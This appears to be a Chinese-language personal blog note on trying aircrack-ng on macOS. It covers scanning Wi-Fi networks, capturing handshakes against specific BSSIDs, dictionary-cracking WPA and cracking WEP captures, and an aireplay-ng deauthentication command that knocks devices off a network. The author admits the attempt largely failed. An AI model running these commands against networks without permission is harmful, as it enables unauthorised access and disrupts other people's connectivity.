---
title: aircrack-ng
date:  19-8-4 2:27 +08
---

# aircrack-ng

记：`airmon-ng` 只在 linux 可用，`airodump-ng` 和 `aireplay-ng` 有问题，系统自带的 `airport` 不能抓包，`tcpdump` 能抓包但不符合 802.11，不搞啦~~  aircrack-ng 从入门到放弃 😂

## 一、准备

```sh
# 1、安装 MacPorts。去官网 https://www.macports.org 下载，查看是否安装成功
port version

# 2、通过 MacPorts 安装 aircrack-ng
sudo port install aircrack-ng

# 查看是否安装成功，会输出版本信息和用法
aircrack-ng
```


## 二、应用

1、扫描。可用 grep 进行过滤，如 `airport en0 scan |grep WEP` 或 `airport en0 scan |grep WPA`

```sh
airport en0 scan
# 或
airport -s
```

显示结果

```sh
#      Wi-Fi名称 地址             信号强度 信道         加密方式(认证)
           SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
             IT 2c:b2:1a:b6:ad:a3 -59  36      Y  -- WPA(PSK/AES,TKIP/TKIP) WPA2(PSK/AES,TKIP/TKIP) 
         appleT b0:be:76:58:67:1f -27  2,+1    Y  -- WPA2(PSK/AES/AES) 
  FoxFly-6C1C3A 00:40:97:72:e3:b9 -25  1,+1    Y  -- WPA2(PSK/AES/AES) 
TP-Link_5033_5G b0:be:76:58:50:32 -49  149     Y  US WPA2(PSK/AES/AES) 
   Wanlikeji888 54:75:95:3e:1d:17 -40  161     Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
         appleT b0:be:76:58:67:1e -38  149     Y  US WPA2(PSK/AES/AES) 
```

2、监听（嗅探、抓包）。

使用 `tcpdump` 抓包
```sh
# src 过滤源地址，-c n 截取 n 个报文，-i 监听网卡，-w 输出到文件
# sudo tcpdump "type mgt subtype beacon and ether src e4:f3:f5:33:11:22" -I -c 1 -i en0 -w beacon.cap

# -i 监听网卡
sudo tcpdump -i en0

# test
airport -s
sudo tcpdump -i en0 "ether src b0:be:76:58:50:32" -w mytest1.cap
sudo tcpdump -i en0 -c 149 -w mytest1.cap
# -w 生成文件名  -c 信道 --bssid MAC地址 
airodump-ng --channel 149 --bssid b0:be:76:58:50:32 -w mytest2 ath0
# 保存成ivs格式
airodump-ng –-ivs -w mytest2 --channel 11 –-bssid 30:b7:d4:93:fc:08
```


3、破解。

```sh
# -w 指定字典文件，pwd.txt 字典路径，mytest.cap 监听生成的文件。执行后会分析文件并询问目标网络，选择有握手包信息的列，如选择 "2"
aircrack-ng -w pwd.txt mytest.cap
# 有多个握手包时。－b：指定要破解的 Wi-Fi BSSID
aircrack-ng -w pwd.txt -b c8:3a:35:30:3e:c8 ./*.cap
# WEP 的可以这样破解，不用加字典。WPA 之类的需要加字典
aircrack-ng spirit-01.ivs
```




## 其他
Aircrack-ng 套件
Name | Description
-|-
Aircrack-ng | 无线密码破解 
Aireplay | 生成网络数据，去客户端验证 
Airodump-ng | 数据包捕捉 
Airbase-ng | 配置伪造的接入点 
Airmon-ng | 启用和禁用无线接口上的监控模式


airport 基本使用

```sh
# 已连接的无线网络
airport -I
# 查看所有无线网络
airport -s

# 查看无线网卡设备
ifconfig
# 启动 eth0 网卡
ifconfig  eth0  up
# 关闭 eth0 网卡
ifconfig  eth0 down
```

使用 `aireplay-ng` 让连接网络的设备断掉重连
```sh
# –deauth 发送次数,一般四五次应该够了；-a 无线网的bssid
aireplay-ng –deauth 5 -a 20:76:93:2E:FE:EC wlan0mon 
```



## 问题

1、用 macOS 自带的 airport 工具查看周围 Wi-Fi 信息。
遇到问题：`airport: command not found`

```sh
# 最终解决：添加软链接。（我的版本 MacOS Mojave，亲测有效）
sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport /usr/local/bin/airport

# 试过但未解决的方法一：在 ～/.bashrc 文件添加如下一行设置别名，并运行 `source ~/.bashrc`
alias airport="/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport"

# 试过但未解决的方法二：也是添加软链接，但会报错 `ln: /usr/sbin/airport: Operation not permitted`。据说适用 MacOSX High Sierra，未试。
sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport
```

2、airport 监听。遇到问题：`Segmentation fault: 11`，据说是 `macOS v10.14` 版本问题， 待升级系统解决。
```sh
# en0 网卡名称，sniff 模式，149 信道
sudo airport en0 sniff 149
```


